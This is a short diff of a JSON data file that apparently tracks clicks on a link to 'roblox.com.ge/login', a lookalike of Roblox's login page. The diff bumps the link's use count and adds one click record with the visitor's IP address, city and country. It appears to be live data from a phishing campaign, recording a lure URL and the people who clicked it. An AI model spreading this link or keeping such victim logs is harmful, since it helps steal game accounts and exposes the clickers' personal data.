@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1263,
+    "useCount": 1264,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10248,6 +10248,14 @@
         "city": "Kota Kinabalu",
         "flag": "🇲🇾",
         "countryCode": "MY"
+      },
+      {
+        "timestamp": 1777361244599,
+        "ip": "182.10.99.181",
+        "country": "Indonesia",
+        "city": "Bandung",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
       }
     ]
   },
